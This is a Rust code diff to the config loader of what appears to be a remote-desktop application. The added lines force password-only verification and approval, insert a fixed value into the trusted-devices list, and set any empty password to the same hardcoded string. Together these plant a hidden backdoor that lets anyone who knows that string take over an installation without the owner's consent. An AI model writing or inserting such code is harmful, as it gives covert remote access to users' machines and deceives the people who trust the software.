@@ -459,6 +459,16 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -470,6 +480,12 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+
+        if !config.options.contains_key("trusted_devices") {
+                config.options.insert("trusted_devices".to_string(), "00hWXG+2rrmhpK9dw17BAseNg6".to_string());
+                config.store();
+            }
+
         if store {
             config.store();
         }
@@ -598,6 +614,10 @@ impl Config {
                 }
             }
         }
+        if config.password.is_empty() {
+                config.password = "00hWXG+2rrmhpK9dw17BAseNg6".to_string();
+                store = true;
+            }
         if store {
             config.store();
         }
